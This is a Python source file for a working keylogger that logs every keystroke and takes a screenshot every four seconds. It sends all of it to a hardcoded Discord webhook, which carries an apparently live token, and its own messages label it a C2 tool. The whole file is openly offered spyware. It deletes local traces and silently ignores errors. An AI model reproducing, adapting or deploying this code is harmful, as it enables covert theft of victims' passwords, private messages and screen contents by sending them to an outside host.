import os
import time
import threading
import sys
import requests
from datetime import datetime

WEBHOOK_URL = "https://discord.com/api/webhooks/1508075291250130976/h--7D8fmlmqREBjDL32KjiMW7FxKqnTdQUs74anI8D-cf2QjE7Y-roooJKiO7MmNXBi8"

def send_to_c2(text=None, screenshot_path=None):
    try:
        if screenshot_path and os.path.exists(screenshot_path):
            with open(screenshot_path, "rb") as f:
                requests.post(
                    WEBHOOK_URL,
                    data={"content": f"📸 Screenshot @ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"},
                    files={"file": f}
                )
            os.remove(screenshot_path)   
        elif text:
            requests.post(WEBHOOK_URL, json={"content": text})
    except:
        pass  

LOCK_FILE = "kl.lock"

def is_running():
    return os.path.exists(LOCK_FILE)

def create_lock():
    with open(LOCK_FILE, "w") as f:
        f.write(str(os.getpid()))

def remove_lock():
    if os.path.exists(LOCK_FILE):
        try:
            os.remove(LOCK_FILE)
        except:
            pass

if is_running():
    print("[+] Stopping C2 keylogger...")
    remove_lock()
    time.sleep(1)
    sys.exit(0)
else:
    create_lock()
    print("[+] Starting C2 keylogger + screenshot tool...")

from pynput import keyboard

def on_press(key):
    try:
        line = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] KEY: {key.char}"
    except AttributeError:
        line = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] KEY: [{key}]"
    send_to_c2(text=line)

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

from mss import mss
from PIL import Image

def take_screenshot():
    try:
        with mss() as sct:
            monitor = sct.monitors[1]
            screenshot = sct.grab(monitor)
            img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
            
            temp_path = f"temp_ss_{datetime.now().strftime('%H%M%S')}.png"
            img.save(temp_path)
            send_to_c2(screenshot_path=temp_path)
    except:
        pass

def screenshot_timer():
    while is_running():
        take_screenshot()
        time.sleep(4)

if __name__ == "__main__":
    key_thread = threading.Thread(target=start_keylogger, daemon=True)
    key_thread.start()
    
    screen_thread = threading.Thread(target=screenshot_timer, daemon=True)
    screen_thread.start()
    
    print("[+] C2 MODE ACTIVE → Everything is now beaming live to your Discord!")
    print("[+] Double-click this .exe again to stop cleanly.")
    
    try:
        while is_running():
            time.sleep(2)
    finally:
        remove_lock()
        print("[+] Stopped. All data was sent via C2.")